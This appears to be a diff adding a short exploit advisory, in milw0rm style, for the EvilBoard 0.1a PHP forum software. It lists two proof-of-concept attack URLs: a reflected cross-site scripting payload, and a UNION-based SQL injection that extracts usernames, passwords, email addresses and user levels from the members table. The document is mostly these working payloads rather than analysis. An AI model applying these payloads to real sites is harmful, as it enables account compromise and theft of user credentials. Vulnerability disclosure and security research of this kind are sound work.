@@ -1,0 +1,26 @@
+#####################################################################
+##
+##  Title: EvilBoard 0.1a (Alpha) Multiple Remote Vulnerabilities
+##  Author: seaofglass, <seaofglass[at]korea.com>
+##  Download: http://sourceforge.net/projects/evilboard
+##  Bug: XSS & Remote Sql Injection
+##  Info: EvilBoard is using PHP and mysql.
+##  MySite: http://seaofglass.backrush.com
+##
+#####################################################################
+
+# bug 1  : XSS
+
+# PoC
+http://host/EvilBoard_0.1a/index.php?c='><script>alert('hi');</script>
+
+
+# bug 2 : Remote SQL Injection
+
+# PoC
+http://host/EvilBoard_0.1a/index.php?c='/**/union/**/select/**/1,concat(username,char(77),password,char(77),email_address,char(77),info,char(77),user_level,char(77))/**/from/**/eb_members/**/where/**/userid=1/*
+
+# thanks
+vangelis, AmesianX
+
+# milw0rm.com [2008-01-08]
